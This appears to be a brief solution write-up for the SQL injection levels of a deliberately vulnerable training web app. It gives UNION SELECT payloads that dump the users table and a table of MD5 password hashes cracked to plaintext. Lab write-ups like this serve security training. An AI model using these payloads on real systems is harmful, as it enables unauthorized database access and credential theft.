# SQL Injection

## low

```sql
' UNION SELECT user, password FROM users;#
```

[cmd5](https://www.cmd5.com)

user|password(hash)|password
-|-|-
admin|`5f4dcc3b5aa765d61d8327deb882cf99`|password
gordonb|`e99a18c428cb38d5f260853678922e03`|abc123
1337|`8d3533d75ae2c3966d7e0d4fcc69216b`|charley
pablo|`0d107d09f5bbe40cade3de5c71e9e9b7`|letmein
smithy|`5f4dcc3b5aa765d61d8327deb882cf99`|password

## medium

```sql
-1 UNION SELECT user, password FROM users;#
```

## high

same as low but a redirection
